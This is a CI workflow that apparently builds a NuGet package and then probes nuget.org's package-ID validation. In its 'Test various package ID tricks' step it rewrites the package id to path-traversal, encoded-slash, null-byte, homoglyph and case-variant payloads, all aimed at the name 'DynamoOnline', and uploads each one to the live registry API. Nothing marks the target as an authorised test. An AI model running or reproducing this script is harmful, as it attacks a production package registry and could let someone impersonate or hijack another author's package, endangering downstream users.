name: Publish to NuGet

on:
  push:
    tags: ['v*']

permissions:
  id-token: write
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      
      - name: Build
        run: dotnet build -c Release
      
      - name: Pack
        run: dotnet pack -c Release -o ./artifacts --no-build

      - name: NuGet Login
        uses: NuGet/login@v1
        id: login
        with:
          user: ${{ secrets.NUGET_USER }}
      
      - name: Test various package ID tricks
        run: |
          cd artifacts
          ORIG_PKG=$(ls *.nupkg)
          
          test_payload() {
            PAYLOAD="$1"
            echo "=== Testing: $PAYLOAD ==="
            
            rm -rf tampered tampered.nupkg
            mkdir tampered
            unzip -o "$ORIG_PKG" -d tampered
            
            # Use | as sed delimiter to avoid / issues
            find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>$PAYLOAD</id>|g" {} \;
            
            cat tampered/*.nuspec
            
            cd tampered
            zip -r ../tampered.nupkg .
            cd ..
            
            RESPONSE=$(curl -s -w "\n%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
              -H "X-NuGet-ApiKey: $NUGET_KEY" \
              -H "X-NuGet-Client-Version: 6.0.0" \
              -H "X-NuGet-Protocol-Version: 4.1.0" \
              -H "User-Agent: NuGet Command Line/6.0.0 (Linux)" \
              -H "Content-Type: application/octet-stream" \
              --data-binary @tampered.nupkg)
            
            echo "Response: $RESPONSE"
            echo ""
          }
          
          test_payload "DynamoOnline/../DynamoTest456"
          test_payload "../DynamoOnline"
          test_payload "DynamoOnline%2FTest"
          test_payload "DynamoOnline%00Test"
          test_payload "DynamoÎŸnline"
          test_payload "DYNAMOONLINE"
          test_payload "dynamoonline"
          test_payload "Dynamo.Online"
        env:
          NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
